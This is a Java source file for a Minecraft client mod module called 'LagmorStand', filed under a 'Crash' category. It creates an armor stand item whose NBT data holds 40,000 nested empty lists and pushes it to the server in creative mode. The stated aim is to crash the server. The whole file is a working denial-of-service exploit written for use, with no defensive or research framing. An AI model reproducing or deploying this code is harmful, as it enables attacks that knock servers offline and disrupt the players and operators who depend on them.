
package minegame159.meteorclient.modules.crash;

import minegame159.meteorclient.modules.Category;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.LiteralText;

public class LagmorStand extends Module {
public LagmorStand(Category category, String name, String description) {
		super(category, name, description);
}

    public LagmorStand() {
        super(Category.Crash, "LagmorStand", "Armour Stand that will crash the server");
    }

    	@Override
    	public void onActivate()
    	{
    		if(!mc.player.abilities.creativeMode)
    		{
    			ChatUtils.error("Creative mode only.");
    			toggle(false);
    			return;
    		}
    		
    		
    		// generate item
    		ItemStack stack = new ItemStack(Items.ARMOR_STAND);
    		CompoundTag nbtCompound = new CompoundTag();
    		ListTag nbtList = new ListTag();
    		for(int i = 0; i < 40000; i++)
    			nbtList.add(new ListTag());
    		nbtCompound.put("SteveHClient", nbtList);
    		stack.setTag(nbtCompound);
    		stack.setCustomName(new LiteralText("Lagmor Stand"));
    		
    		// give 
    		if(placeStackInHotbar(stack))
    			ChatUtils.info("Stand created.");
    		else
    			ChatUtils.error("Please clear a slot in your hotbar.");
    		
    		toggle(false);
    	}
    	
    	private boolean placeStackInHotbar(ItemStack stack)
    	{
    		for(int i = 0; i < 9; i++)
    		{
    			if(!mc.player.inventory.getStack(i).isEmpty())
    				continue;
    			
    			mc.player.networkHandler.sendPacket(
    				new CreativeInventoryActionC2SPacket(36 + i, stack));
    			return true;
    		}
    		
    		return false;
    	}
    	{ }
    	}
    
